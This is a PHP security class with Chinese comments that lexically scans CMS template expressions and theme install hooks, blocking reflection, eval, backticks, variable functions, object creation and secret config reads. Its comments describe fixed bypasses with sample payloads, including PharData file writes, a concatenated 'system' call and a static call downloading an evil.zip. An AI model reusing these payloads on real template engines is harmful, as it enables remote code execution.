<?php
namespace App\Service\System;

/**
 * L1 词法安全校验（基础设施任务 2）
 *
 * 基于 PHP 内建 token_get_all()（不依赖 ext-ast / PHP-Parser），与 TemplateService
 * 既有正则黑名单（assertSafeEditableCode）并行运行、互不替换：
 * - 正则层：词边界/调用形态/符号禁令/指令表达式深扫（既有五层，保持原样）
 * - 词法层（本类）：token 级识别——调用位置的危险函数名、Reflection* 反射类、
 *   变量函数 $fn()、变量方法 $o->$m()、变量变量 $$x/${...}、反引号、PHP 段残留、
 *   Closure::fromCallable 首类可调用向量
 *
 * 适用面：可编辑模板（template 主题目录下 html 文件，front 主题）保存路径。
 * 管理模板（core/admin/html/**，raw PHP）不在可编辑面，不经本校验。
 *
 * 误报基线（全语料实测）：template/ 与 core/admin/html/ 中
 * $$var / $fn( / Reflection 命中数 = 0 ⇒ 阻断集成安全。
 *
 * 上线前审计（第九轮）修复两处 RCE 门禁绕过：
 * - VULN-C01 `new <内置类>->方法()` 不受约束（原实现把 T_NEW 当 memberCall 跳过白名单，
 *   注释所称"构造调用有独立闸"并不存在）⇒ 现对 new / use 导入一律 fail-closed；
 * - VULN-C03 `\ReflectionFunction`（PHP8 = T_NAME_FULLY_QUALIFIED）漏判 ⇒ 现对名字 token
 *   统一按反斜杠归一取最后一段比对，且对任意位置生效。
 * 另补 I-01：`{@EXPR}` 指令纳入表达式提取（原提取正则只覆盖 `name:` 形态）。
 */
class LexicalSafetyService
{
    /** @var string[] 反射类族（词法层新增覆盖，正则黑名单未收录） */
    private static $reflectionClasses = array(
        'reflectionfunction', 'reflectionmethod', 'reflectionclass', 'reflectionobject',
        'reflectionproperty', 'reflectionenum', 'reflectionattribute', 'reflectionconstant',
        'reflectionparameter', 'reflectionextension', 'reflectiontype', 'reflectionnamedtype',
        'reflectionuniontype', 'reflectionintersectionsptype', 'reflectiongenerator',
        'reflectionreference', 'reflectionfiber', 'reflectionzendextension',
    );

    /**
     * 扫描单条模板指令表达式（{if:}/{loop:}/{php:}/{vars:}/{@}/{...}/{$...} 内容——
     * 这些表达式会被编译器原样写入 PHP，是词法校验的主战场）
     * @return array[] findings: array('kind','name','expr')
     */
    public static function scanExpression(string $expr, bool $strict = true): array
    {
        // 包裹为 PHP 片段以获得正确的 token 流（token_get_all 不要求语法合法）
        // 表达式走函数白名单（模板是可直接编译执行的攻击面）；整段源码扫描（主题钩子）不套白名单
        // $strict=true：指令表达式（{if:}/{elseif:}/{loop:}/{php:}/{vars:}/{@}）——另禁赋值/自增减、
        // 输出与终止语句、成员/静态访问（安全审查 H-1）。{$...} 变量路径形态传 false（编译器只认纯变量路径，
        // 不可能含运算符；语料里 maccms 写法 `{$vo.x|mac_default='y'}` 不会被编译，仅原样输出）。
        $tokens = @token_get_all('<?php ' . $expr . ';');
        $findings = self::scanTokens($tokens, $expr, true, $strict);
        // 审查轮 U-1 步骤 2：严格指令表达式再过一道 token 级「默认拒绝」白名单文法（见 scanExprWhitelist）。
        // scanTokens 给精确语义文案在前；白名单兜住一切未枚举构造（裸标识符/强制转换外符号/插值引号等）。
        if ($strict) {
            foreach (self::scanExprWhitelist($tokens, $expr) as $f) $findings[] = $f;
        }
        return $findings;
    }

    /**
     * 安全审查 H-1：模板可见变量根名闸——$GLOBALS 与超全局（$_SESSION/$_SERVER/...）一律拒绝；
     * $conf 的凭据类键（auth_key/db/cache/cloud_api/...）拒绝（运行期模板 $conf 本就是脱敏副本，此处给出保存期明确反馈）。
     * @param string $root 变量名（不含 $）
     * @param string $key  第一级下标（可空）
     */
    private static function varRootFindings(string $root, string $key, string $expr): array
    {
        static $super = array('GLOBALS' => 1, '_GET' => 1, '_POST' => 1, '_COOKIE' => 1, '_REQUEST' => 1,
            '_SERVER' => 1, '_ENV' => 1, '_FILES' => 1, '_SESSION' => 1, 'http_response_header' => 1, 'argv' => 1);
        // R3-1：引导期机密与其它不可见根 —— 即使误入白名单也拒绝
        static $denied = array('secret_value' => 1, 'secret_conf' => 1, 'dbConf' => 1, 'sid' => 1,
            'auth_key' => 1, 'password' => 1);
        if (isset($super[$root])) {
            return array(array('kind' => 'superglobal', 'name' => '$' . $root, 'expr' => $expr));
        }
        if (isset($denied[$root])) {
            return array(array('kind' => 'var_root_denied', 'name' => '$' . $root, 'expr' => $expr));
        }
        // R3-1 根治：变量根名白名单（主题模板实测语料）；未登记根一律拒绝
        static $allow = null;
        if ($allow === null) {
            $allow = array_fill_keys(TemplateService::templateVarRootAllowlist(), 1);
        }
        if (!isset($allow[$root])) {
            return array(array('kind' => 'var_root_denied', 'name' => '$' . $root, 'expr' => $expr));
        }
        if (($root === 'conf' || $root === '__tplconf') && $key !== ''
            && !in_array($key, TemplateService::templateConfPublicKeys(), true)
            && TemplateService::templateConfKeyLooksSecret($key)) {
            return array(array('kind' => 'conf_secret', 'name' => '$' . $root . '.' . $key, 'expr' => $expr));
        }
        return array();
    }

    /** {$a.b} / {$a[b]} / {h:$a.b} 形态：取根名与第一级下标做 varRootFindings */
    private static function varPathFindings(string $path, string $expr): array
    {
        if (!preg_match('#^\s*([a-zA-Z_\x80-\xff][\w\x80-\xff]*)\s*(?:\.\s*(\w+)|\[\s*[\'"]?(\w+)[\'"]?\s*\])?#', $path, $m)) {
            return array();
        }
        $key = isset($m[2]) && $m[2] !== '' ? $m[2] : (isset($m[3]) ? $m[3] : '');
        return self::varRootFindings($m[1], $key, $expr);
    }

    /**
     * 审查轮 U-1 步骤 2：主题 install.php/uninstall.php 执行钩子的「默认拒绝」token 白名单
     * （替换原十六进制黑名单口径）。只放行数据清理类调用：函数名前缀 kv_ / db_，实参仅限
     * 字符串/数值/bool/null 字面量与 array(...) 字面量；其余一切构造（变量、运算、控制流、
     * 其他调用、成员访问等）各记一条 finding ⇒ 拒绝执行。商店在架 49 套主题实测均无
     * install/uninstall 钩子（零回归），此闸为第三方包纵深防线。
     * @return array[] findings（空=可执行）
     */
    public static function scanThemeHook(string $code): array
    {
        $findings = array();
        $tokens = @token_get_all($code);
        $n = count($tokens);
        static $allowTypes = null;
        if ($allowTypes === null) {
            $allowTypes = array();
            foreach (array('T_OPEN_TAG', 'T_CLOSE_TAG', 'T_INLINE_HTML', 'T_WHITESPACE',
                'T_COMMENT', 'T_DOC_COMMENT', 'T_CONSTANT_ENCAPSED_STRING', 'T_LNUMBER',
                'T_DNUMBER', 'T_ARRAY', 'T_DOUBLE_ARROW') as $c) {
                if (defined($c)) $allowTypes[constant($c)] = true;
            }
        }
        static $allowChars = array('(' => 1, ')' => 1, '[' => 1, ']' => 1, ',' => 1, ';' => 1, '.' => 1, '-' => 1);
        static $allowConst = array('true' => 1, 'false' => 1, 'null' => 1);
        for ($i = 0; $i < $n; $i++) {
            $tok = $tokens[$i];
            if (!is_array($tok)) {
                if (!isset($allowChars[$tok])) $findings[] = array('kind' => 'hook_token', 'name' => (string)$tok, 'expr' => '');
                continue;
            }
            $type = $tok[0];
            if (isset($allowTypes[$type])) continue;
            if ($type === T_STRING) {
                $low = strtolower($tok[1]);
                $next = self::nextSignificant($tokens, $i + 1);
                if ($next !== null && $next[0] === '(') {
                    if (strncmp($low, 'kv_', 3) === 0 || strncmp($low, 'db_', 3) === 0) continue;
                    $findings[] = array('kind' => 'hook_call', 'name' => $tok[1], 'expr' => '');
                    continue;
                }
                if (isset($allowConst[$low])) continue;
                $findings[] = array('kind' => 'hook_identifier', 'name' => $tok[1], 'expr' => '');
                continue;
            }
            $findings[] = array('kind' => 'hook_token', 'name' => token_name($type), 'expr' => '');
        }
        return $findings;
    }

    /**
     * 共享 token 级危险构造扫描（表达式与整段源码同口径）
     * @return array[] findings
     */
    private static function scanTokens(array $tokens, string $expr, bool $enforceAllowlist = false, bool $strict = false): array
    {
        $findings = array();
        $n = count($tokens);
        // 安全审查 H-1：指令表达式只读——赋值/复合赋值/自增减、输出/终止/全局声明类语句、成员与静态访问一律拒绝
        static $assignTypes = null, $constructTypes = null, $memberTypes = null;
        if ($assignTypes === null) {
            $assignTypes = array();
            foreach (array('T_PLUS_EQUAL', 'T_MINUS_EQUAL', 'T_MUL_EQUAL', 'T_DIV_EQUAL', 'T_CONCAT_EQUAL',
                           'T_MOD_EQUAL', 'T_AND_EQUAL', 'T_OR_EQUAL', 'T_XOR_EQUAL', 'T_SL_EQUAL', 'T_SR_EQUAL',
                           'T_POW_EQUAL', 'T_COALESCE_EQUAL', 'T_INC', 'T_DEC') as $c) {
                if (defined($c)) $assignTypes[] = constant($c);
            }
            $constructTypes = array();
            foreach (array('T_PRINT', 'T_ECHO', 'T_EXIT', 'T_UNSET', 'T_GLOBAL', 'T_STATIC', 'T_FUNCTION',
                           'T_FN', 'T_GOTO', 'T_HALT_COMPILER', 'T_CLASS', 'T_DECLARE', 'T_INLINE_HTML',
                           'T_START_HEREDOC', 'T_YIELD', 'T_YIELD_FROM', 'T_THROW') as $c) {
                if (defined($c)) $constructTypes[] = constant($c);
            }
            $memberTypes = array();
            foreach (array('T_OBJECT_OPERATOR', 'T_NULLSAFE_OBJECT_OPERATOR', 'T_DOUBLE_COLON') as $c) {
                if (defined($c)) $memberTypes[] = constant($c);
            }
        }
        for ($i = 0; $i < $n; $i++) {
            $tok = $tokens[$i];
            if ($strict && !is_array($tok) && $tok === '=') {
                $findings[] = array('kind' => 'assignment', 'name' => '=', 'expr' => $expr);
                continue;
            }
            if ($strict && is_array($tok)) {
                if (in_array($tok[0], $assignTypes, true)) {
                    $findings[] = array('kind' => 'assignment', 'name' => $tok[1], 'expr' => $expr);
                    continue;
                }
                if (in_array($tok[0], $constructTypes, true)) {
                    $findings[] = array('kind' => 'construct', 'name' => $tok[1], 'expr' => $expr);
                    continue;
                }
                if (in_array($tok[0], $memberTypes, true)) {
                    $findings[] = array('kind' => 'member_access', 'name' => $tok[1], 'expr' => $expr);
                    continue;
                }
            }
            if ($enforceAllowlist && is_array($tok) && $tok[0] === T_VARIABLE) {
                $key = '';
                $nb = self::nextSignificantIndex($tokens, $i + 1);
                if ($nb !== null && $tokens[$nb] === '[') {
                    $nk = self::nextSignificantIndex($tokens, $nb + 1);
                    $nc = $nk === null ? null : self::nextSignificantIndex($tokens, $nk + 1);
                    $simple = $nk !== null && $nc !== null && $tokens[$nc] === ']' && is_array($tokens[$nk])
                        && in_array($tokens[$nk][0], array(T_CONSTANT_ENCAPSED_STRING, T_STRING, T_LNUMBER), true);
                    if ($simple) {
                        $key = $tokens[$nk][0] === T_CONSTANT_ENCAPSED_STRING
                            ? self::decodeStringLiteral($tokens[$nk][1]) : $tokens[$nk][1];
                    } elseif ($tok[1] === '$conf' || $tok[1] === '$__tplconf') {
                        // $conf[动态下标]（拼接/变量/表达式）无法静态判定是否取凭据键——拒绝
                        $findings[] = array('kind' => 'conf_secret', 'name' => $tok[1] . '[dynamic]', 'expr' => $expr);
                    }
                }
                foreach (self::varRootFindings(substr($tok[1], 1), $key, $expr) as $f) $findings[] = $f;
            }
            if (!is_array($tok)) {
                // 单字符 token：反引号（shell 执行）/ 变量变量 $ / 动态可调用
                if ($tok === '`') {
                    $findings[] = array('kind' => 'backtick', 'name' => '`', 'expr' => $expr);
                }
                if ($tok === '$') {
                    $after = self::nextSignificant($tokens, $i + 1);
                    if ($after !== null && $after[0] === T_VARIABLE) {
                        $findings[] = array('kind' => 'var_var', 'name' => '$$' . $after[1], 'expr' => $expr);
                    }
                }
                // 动态可调用形态（括号包裹的字符串/拼接表达式、数组元素后直接跟调用括号）：
                // 调用括号前的有效 token 为 ) ] 变量 或字符串字面量。
                if ($tok === '(') {
                    $prev = self::prevSignificant($tokens, $i - 1);
                    if ($prev !== null && ($prev[1] === ')' || $prev[1] === ']' || $prev[0] === T_VARIABLE || $prev[0] === T_CONSTANT_ENCAPSED_STRING)) {
                        $findings[] = array('kind' => 'dynamic_call', 'name' => (string)$prev[1], 'expr' => $expr);
                    }
                }
                continue;
            }
            list($type, $text) = $tok;
            if ($type === T_WHITESPACE) continue;

            $next  = self::nextSignificant($tokens, $i + 1);
            $prev  = self::prevSignificant($tokens, $i - 1);
            $lower = strtolower($text);

            // 名字 token 归一：取最后一段（覆盖 PHP8 的 \Foo / Foo\Bar 与普通 T_STRING）
            $isName = ($type === T_STRING);
            if (!$isName && defined('T_NAME_FULLY_QUALIFIED') && $type === T_NAME_FULLY_QUALIFIED) $isName = true;
            if (!$isName && defined('T_NAME_QUALIFIED') && $type === T_NAME_QUALIFIED) $isName = true;
            $base = $lower;
            if ($isName) {
                $bs = strrpos($base, '\\');
                if ($bs !== false) $base = substr($base, $bs + 1);
            }

            // ---- (1) 反射类族（最具体，优先报出） --------------------------------
            // VULN-C03：`\ReflectionFunction` 在 PHP8 分词为 T_NAME_FULLY_QUALIFIED，
            // 原判定只认 T_STRING ⇒ `use \ReflectionFunction as RF; new RF($n); ->invoke()`
            // 整链绕过主题执行钩子闸。现按反斜杠归一取最后一段，对**任意位置**生效。
            // 先于下面的 new 闸判定：`new ReflectionFunction(...)` 应报「反射」而非泛化的
            // 「对象实例化」——反射是更精确、更可操作的安全语义（既有集成断言依赖此）。
            if ($isName && in_array($base, self::$reflectionClasses, true)) {
                $findings[] = array('kind' => 'reflection', 'name' => $text, 'expr' => $expr);
                continue;
            }
            if ($isName && $base === 'closure' && $next !== null && $next[0] === T_DOUBLE_COLON) {
                $findings[] = array('kind' => 'first_class_callable', 'name' => $text . '::', 'expr' => $expr);
                continue;
            }

            // ---- (2) 对象实例化与导入：一律禁止 ---------------------------------
            // VULN-C01（上线前审计）：原实现把 T_NEW 当作 memberCall 跳过函数
            // 白名单，而注释所称的"构造调用独立闸"并不存在 ⇒
            //   {if:(new \PharData("/tmp/x.tar"))->addFromString("s.php", 一段原生 php 代码)}
            // 两层闸（legacyRegexFindings + scanTemplate）全过，可落地任意文件写入
            // （→ 写入可执行脚本）、内网 SSRF（new \SoapClient）、Redis/MySQL 命令（new \Redis）。
            // 模板语料零使用 ⇒ 直接禁止，零回归。确需对象由服务端预置变量传入。
            if ($type === T_NEW) {
                $findings[] = array('kind' => 'new_object', 'name' => 'new', 'expr' => $expr);
                continue;
            }
            // VULN-C03 配套：use 导入语句（`use (` 为闭包捕获语法，放行）
            if ($type === T_USE) {
                if (!($next !== null && $next[0] === '(')) {
                    $findings[] = array('kind' => 'use_import', 'name' => 'use', 'expr' => $expr);
                    continue;
                }
            }

            // ---- (3) eval / include 语句型 --------------------------------------
            if ($type === T_EVAL) {
                $findings[] = array('kind' => 'eval', 'name' => $text, 'expr' => $expr);
                continue;
            }
            if (in_array($type, array(T_INCLUDE, T_INCLUDE_ONCE, T_REQUIRE, T_REQUIRE_ONCE), true)) {
                $findings[] = array('kind' => 'include', 'name' => $text, 'expr' => $expr);
                continue;
            }

            // ---- (4) 危险函数调用 / 模板表达式函数白名单 -------------------------
            if ($isName && $next !== null && $next[0] === '(') {
                if ($base === 'fromcallable') {
                    $findings[] = array('kind' => 'first_class_callable', 'name' => $text, 'expr' => $expr);
                    continue;
                }
                if (in_array($base, self::$reflectionClasses, true)) {
                    $findings[] = array('kind' => 'reflection', 'name' => $text, 'expr' => $expr);
                    continue;
                }
                // 上线前终检修复（N-01，High）：原实现把「成员/静态调用」整体免检，理由写的是
                // 「对象实例化已在 (1) 全局禁止，故不存在用白名单外类的方法的旁路」——**该论证是错的**：
                // `Foo::bar()` 不需要 new，任何已加载类的静态方法都能被调用并传字符串参数。
                // 实测（修复前）：`{if:\App\Service\System\TemplateService::download("http://…/evil.zip","x")}`
                // 过闸 → 服务器下载并解包主题包 → 把 `template/<dir>/uninstall.php`（内容为任意 PHP 代码）
                // 写进 docroot（端到端落地）。
                // 模板表达式对静态/方法调用**零需求**（全仓 `{if:}`/`{@}` 内 `::` 与 `->` 实测用量 0），
                // 故一律拒绝，而不是"免检"。
                if ($enforceAllowlist) {
                    $callKind = '';
                    if ($prev !== null) {
                        $pt = $prev[0];
                        if ($pt === T_DOUBLE_COLON) $callKind = 'static_call';
                        elseif ($pt === T_OBJECT_OPERATOR) $callKind = 'method_call';
                        elseif (defined('T_NULLSAFE_OBJECT_OPERATOR') && $pt === T_NULLSAFE_OBJECT_OPERATOR) $callKind = 'method_call';
                    }
                    if ($callKind !== '') {
                        $findings[] = array('kind' => $callKind, 'name' => $text, 'expr' => $expr);
                        continue;
                    }
                    if (!in_array($base, \App\Service\System\TemplateService::safeTemplateCallAllowlist(), true)) {
                        $findings[] = array('kind' => 'unknown_call', 'name' => $text, 'expr' => $expr);
                        continue;
                    }
                }
            }

            // ---- (5) （反射类族 / Closure:: 已在 (1) 优先判定，此处不再重复） ------

            // ---- (6) 变量函数 / 变量方法 / 变量变量 -------------------------------
            if ($type === T_VARIABLE && $next !== null && $next[0] === '(') {
                $findings[] = array('kind' => 'var_func', 'name' => $text, 'expr' => $expr);
                continue;
            }
            if ($type === T_OBJECT_OPERATOR && $next !== null && $next[0] === T_VARIABLE) {
                $after = self::nextSignificant($tokens, $i + 2);
                if ($after !== null && $after[0] === '(') {
                    $findings[] = array('kind' => 'var_method', 'name' => $text . $next[1], 'expr' => $expr);
                }
                continue;
            }
            if ($type === T_DOLLAR_OPEN_CURLY_BRACES) {
                $findings[] = array('kind' => 'var_var', 'name' => '${', 'expr' => $expr);
                continue;
            }
        }
        // 上线前审计：按「语义具体度」重排 findings，而非按源码 token 位置。
        // 动机：`{if:(new ReflectionFunction("system"))->invoke("x")}` 中 `new` 先于类名出现，
        // 位置序会把泛化的 new_object 排在具体的 reflection 之前，掩盖更可操作的安全语义
        // （排序须保证：能报出 reflection，而不是先报泛化的对象实例化）。
        // 拦截结论不变（findings 非空即拦），仅影响「首条文案」。稳定排序，同权重保持出现序。
        if (count($findings) > 1) {
            static $rank = array(
                'reflection' => 0, 'first_class_callable' => 0, 'backtick' => 0,
                'eval' => 1, 'include' => 1, 'dangerous_call' => 1, 'callback_string' => 1,
                'var_func' => 2, 'var_method' => 2, 'var_var' => 2, 'dynamic_call' => 2,
                'use_import' => 3, 'new_object' => 3, 'unknown_call' => 3,
                'superglobal' => 1, 'conf_secret' => 1, 'assignment' => 2, 'construct' => 2, 'member_access' => 3,
                'php_tag' => 4,
                'bare_identifier' => 3, 'disallowed_token' => 3, 'named_token' => 3,
            );
            $idx = 0;
            foreach ($findings as &$__f) { $__f['_i'] = $idx++; }
            unset($__f);
            usort($findings, function ($a, $b) use ($rank) {
                $ra = isset($rank[$a['kind']]) ? $rank[$a['kind']] : 9;
                $rb = isset($rank[$b['kind']]) ? $rank[$b['kind']] : 9;
                return $ra === $rb ? ($a['_i'] - $b['_i']) : ($ra - $rb);
            });
            foreach ($findings as &$__f) { unset($__f['_i']); }
            unset($__f);
        }
        return $findings;
    }

    /**
     * 扫描整个模板文件内容：
     * 1) 全文件 token 流——检测 PHP 段残留（front 模板由 <? 符号禁令拦截，此处为纵深冗余）
     * 2) 指令表达式提取（与 assertSafeEditableCode 同口径正则）→ 逐条 scanExpression
     * @return array[] findings
     */
    public static function scanTemplate(string $code): array
    {
        $findings = array();
        $tokens = @token_get_all($code);
        $phpSeen = '';
        foreach ($tokens as $tok) {
            if (!is_array($tok)) continue;
            if ($tok[0] === T_OPEN_TAG || $tok[0] === T_OPEN_TAG_WITH_ECHO || $tok[0] === T_CLOSE_TAG) {
                $phpSeen .= $tok[1];
                continue;
            }
            if ($phpSeen !== '' && $tok[0] !== T_WHITESPACE) {
                // PHP 段内的实质 token（front 模板本不应存在）
                $findings[] = array('kind' => 'php_tag', 'name' => substr($tok[1], 0, 40), 'expr' => $phpSeen);
            }
        }
        if ($phpSeen !== '' && empty($findings)) {
            // PHP 段存在但仅空白——仍记录（纵深冗余，正则符号层已先行拦截）
            $findings[] = array('kind' => 'php_tag', 'name' => $phpSeen, 'expr' => $phpSeen);
        }

        // 指令表达式提取（与既有深扫同口径）
        $exprs = array();
        if (preg_match_all('#\{(?:if|elseif|loop|php|vars):(.*?)\}#is', $code, $mm)) {
            $exprs = array_merge($exprs, $mm[1]);
        }
        // 上线前审计修复（I-01）：`{@EXPR}` 单独提取——view.php 的 tpl_allow_expr 分支把它编译为
        // 一段 php echo 语句。原提取正则只覆盖 `name:` 形态，`{@...}` 完全不在扫描面内
        // （实测 `{@$f="sys"."tem"}{@$f("id")}`、反引号形态均全过）。线上 tpl_allow_expr=0
        // 时该指令被剥离，属纵深；一旦该开关经 KV 写入打开即为 RCE。
        // 与上面同一惰性语义：取到第一个 `}` 为止。
        if (preg_match_all('#\{@([^}]*)\}#s', $code, $mm3)) {
            $exprs = array_merge($exprs, $mm3[1]);
        }
        foreach ($exprs as $expr) {
            foreach (self::scanExpression($expr) as $f) {
                $findings[] = $f;
            }
        }
        // {$...} 与 {h:$...} 变量路径形态：根名闸（$GLOBALS/超全局/$conf 凭据键）+ 非严格 token 扫描
        $paths = array();
        if (preg_match_all('#\{\$([^{}]*)\}#s', $code, $mm2)) {
            $paths = array_merge($paths, $mm2[1]);
        }
        if (preg_match_all('#\{h:\$([^{}]*)\}#s', $code, $mm4)) {
            $paths = array_merge($paths, $mm4[1]);
        }
        foreach ($paths as $expr) {
            foreach (self::varPathFindings($expr, $expr) as $f) {
                $findings[] = $f;
            }
            foreach (self::scanExpression($expr, false) as $f) {
                $findings[] = $f;
            }
        }
        return $findings;
    }

    /**
     * 审查轮 U-1 步骤 2：严格指令表达式的「默认拒绝」token 文法白名单。
     * 只放行只读表达式所需的最小 token 集合，其余一律记 finding（与 scanTokens 的精确语义判定叠加）。
     * 放行：变量读取（T_VARIABLE，变量根闸由 scanTokens 另行施加）、数值/单双引号字面量、
     *       true/false/null、允许常量（DEBUG）、比较/逻辑/算术/位运算、括号、方括号下标、
     *       点号数组路径段、三元 ?:、(int)/(float)/(string)/(bool) 转换、函数调用名（具体名单
     *       由 scanTokens unknown_call 施加）、isset/empty/array 构造、数组 => 。
     * 拒绝：= / 自增减、-> / :: / new / use（多由 scanTokens 另报）、裸标识符（未闭合常量，
     *       如 {if:$conf.db} 的 db——改为编译期拒绝，而非 undefined constant 的 500）、
     *       命名空间限定名、反引号/变量变量/字符串插值引号/heredoc/(array)/(object) 等未枚举 token。
     * @param array  $tokens token_get_all('<?php EXPR;') 结果
     * @param string $expr   原表达式（finding 回显）
     * @return array[] findings
     */
    private static function scanExprWhitelist(array $tokens, string $expr): array
    {
        $findings = array();
        // 点号数组路径根名闸：$conf.db / $_SERVER.x 在编译期（view.php rep_dot）转成 $var['key']
        // 数组下标；此处对根名+首段施加 varRootFindings（$conf 凭据键 / 超全局）。
        if (preg_match_all('#\$([a-zA-Z_][\w]*)((?:\.[a-zA-Z0-9_]+)+)#', $expr, $dm, PREG_SET_ORDER)) {
            foreach ($dm as $g) {
                $seg = explode('.', ltrim($g[2], '.'));
                foreach (self::varRootFindings($g[1], isset($seg[0]) ? $seg[0] : '', $expr) as $f) $findings[] = $f;
            }
        }
        static $allowTypes = null;
        if ($allowTypes === null) {
            $allowTypes = array();
            foreach (array(
                'T_OPEN_TAG', 'T_WHITESPACE', 'T_COMMENT', 'T_DOC_COMMENT', 'T_CLOSE_TAG',
                'T_VARIABLE', 'T_LNUMBER', 'T_DNUMBER', 'T_CONSTANT_ENCAPSED_STRING',
                'T_ISSET', 'T_EMPTY', 'T_ARRAY', 'T_DOUBLE_ARROW',
                'T_LOGICAL_AND', 'T_LOGICAL_OR', 'T_LOGICAL_XOR', 'T_BOOLEAN_AND', 'T_BOOLEAN_OR',
                'T_IS_EQUAL', 'T_IS_NOT_EQUAL', 'T_IS_IDENTICAL', 'T_IS_NOT_IDENTICAL',
                'T_IS_SMALLER_OR_EQUAL', 'T_IS_GREATER_OR_EQUAL', 'T_SPACESHIP',
                'T_COALESCE', 'T_POW', 'T_SL', 'T_SR',
                'T_INT_CAST', 'T_DOUBLE_CAST', 'T_STRING_CAST', 'T_BOOL_CAST',
            ) as $c) {
                if (defined($c)) $allowTypes[constant($c)] = true;
            }
        }
        static $allowChars = array(
            '(' => 1, ')' => 1, '[' => 1, ']' => 1, '+' => 1, '-' => 1, '*' => 1, '/' => 1,
            '%' => 1, '.' => 1, '!' => 1, '<' => 1, '>' => 1, '?' => 1, ':' => 1, ',' => 1,
            '&' => 1, '|' => 1, '^' => 1, '~' => 1, ';' => 1,
        );
        static $allowConst = array('true' => 1, 'false' => 1, 'null' => 1, 'debug' => 1);
        // 显著 token 下标序列（跳过空白/注释），便于取前/前前 token 判断点号路径
        $sig = array();
        $n = count($tokens);
        for ($i = 0; $i < $n; $i++) {
            $t = $tokens[$i];
            if (is_array($t) && ($t[0] === T_WHITESPACE || $t[0] === T_COMMENT || $t[0] === T_DOC_COMMENT)) continue;
            $sig[] = $i;
        }
        $norm = function ($tok) { return is_array($tok) ? $tok : array(0 => $tok, 1 => (string)$tok); };
        $m = count($sig);
        for ($p = 0; $p < $m; $p++) {
            $tok = $tokens[$sig[$p]];
            if (!is_array($tok)) {
                if (!isset($allowChars[$tok])) $findings[] = array('kind' => 'disallowed_token', 'name' => (string)$tok, 'expr' => $expr);
                continue;
            }
            $type = $tok[0];
            // 裸词数组键 [word]：含 PHP 保留字（list/array 等，token 非 T_STRING）。编译期 rep_vars 会把
            // [word] 一律转成 ['word'] 字符串键，无副作用，故单个标识符词夹在 [ ] 之间统一放行。
            $bkPrev = $p - 1 >= 0 ? $norm($tokens[$sig[$p - 1]]) : null;
            $bkNext = $p + 1 < $m ? $norm($tokens[$sig[$p + 1]]) : null;
            if ($bkPrev !== null && $bkPrev[1] === '[' && $bkNext !== null && $bkNext[1] === ']'
                && isset($tok[1]) && preg_match('/^[a-zA-Z_]\w*$/', $tok[1])) continue;
            if (isset($allowTypes[$type])) continue;
            $isName = ($type === T_STRING)
                || (defined('T_NAME_FULLY_QUALIFIED') && $type === T_NAME_FULLY_QUALIFIED)
                || (defined('T_NAME_QUALIFIED') && $type === T_NAME_QUALIFIED);
            if ($isName) {
                if ($type !== T_STRING) { $findings[] = array('kind' => 'named_token', 'name' => $tok[1], 'expr' => $expr); continue; }
                $low = strtolower($tok[1]);
                $next = $p + 1 < $m ? $norm($tokens[$sig[$p + 1]]) : null;
                $prev = $p - 1 >= 0 ? $norm($tokens[$sig[$p - 1]]) : null;
                $pp   = $p - 2 >= 0 ? $norm($tokens[$sig[$p - 2]]) : null;
                if ($next !== null && $next[1] === '(') continue;                         // 函数调用（名单由 unknown_call 施加）
                if (isset($allowConst[$low])) continue;                                   // true/false/null/DEBUG
                if ($prev !== null && $prev[1] === '[' && $next !== null && $next[1] === ']') continue; // 裸词下标 $v[word]
                if ($prev !== null && $prev[1] === '.' && $pp !== null && ($pp[0] === T_VARIABLE || $pp[0] === T_STRING)) continue; // 点号路径段
                $findings[] = array('kind' => 'bare_identifier', 'name' => $tok[1], 'expr' => $expr);
                continue;
            }
            $findings[] = array('kind' => 'disallowed_token', 'name' => token_name($type), 'expr' => $expr);
        }
        return $findings;
    }

    /** 解码 PHP 字符串字面量 token（单双引号）用于回调名比对 */
    private static function decodeStringLiteral(string $text): string
    {
        $len = strlen($text);
        if ($len < 2) return '';
        $quote = $text[0];
        $inner = substr($text, 1, -1);
        if ($quote === "'") {
            return str_replace(array('\\\\', "\\'"), array('\\', "'"), $inner);
        }
        return stripcslashes($inner);
    }

    /** 上一个有效 token（跳过空白与注释；null=无） */
    private static function prevSignificant(array $tokens, int $from): ?array
    {
        for ($i = $from; $i >= 0; $i--) {
            $t = $tokens[$i];
            if (is_array($t) && ($t[0] === T_WHITESPACE || $t[0] === T_COMMENT || $t[0] === T_DOC_COMMENT)) continue;
            return is_array($t) ? $t : array(0 => $t, 1 => (string)$t);
        }
        return null;
    }

    /** 下一个有效 token 的下标（跳过空白与注释；null=无） */
    private static function nextSignificantIndex(array $tokens, int $from): ?int
    {
        $n = count($tokens);
        for ($i = $from; $i < $n; $i++) {
            $t = $tokens[$i];
            if (is_array($t) && ($t[0] === T_WHITESPACE || $t[0] === T_COMMENT || $t[0] === T_DOC_COMMENT)) continue;
            return $i;
        }
        return null;
    }

    /** 下一个有效 token（跳过空白与注释；null=无） */
    private static function nextSignificant(array $tokens, int $from): ?array
    {
        $n = count($tokens);
        for ($i = $from; $i < $n; $i++) {
            $t = $tokens[$i];
            if (is_array($t) && ($t[0] === T_WHITESPACE || $t[0] === T_COMMENT || $t[0] === T_DOC_COMMENT)) continue;
            return is_array($t) ? $t : array(0 => $t, 1 => (string)$t);
        }
        return null;
    }
}
